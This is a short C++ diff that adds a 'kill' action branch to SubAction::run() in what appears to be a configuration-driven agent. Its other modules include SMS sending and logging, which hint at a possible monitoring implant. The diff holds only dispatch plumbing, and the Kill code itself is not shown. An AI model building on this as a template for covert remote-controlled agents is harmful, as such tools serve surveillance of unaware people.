@@ -6,6 +6,7 @@
 #include "Enable.h"
 #include "SendSms.h"
 #include "LogInformation.h"
+#include "Kill.h"
 
 #include "UberLog.h"
 
@@ -106,6 +107,17 @@ INT SubAction::run() {
 			stopAction = logInfo->getStop();
 
 			delete logInfo;
+			break;
+		}
+
+		if (actionType.compare(L"kill") == 0) {
+			DBG_TRACE(L"Debug - SubAction.cpp - executing \"kill\"\n", 1, FALSE);
+			Kill *kill = new Kill(conf);
+
+			ret = kill->run();
+			stopAction = kill->getStop();
+
+			delete kill;
 			break;
 		}
 
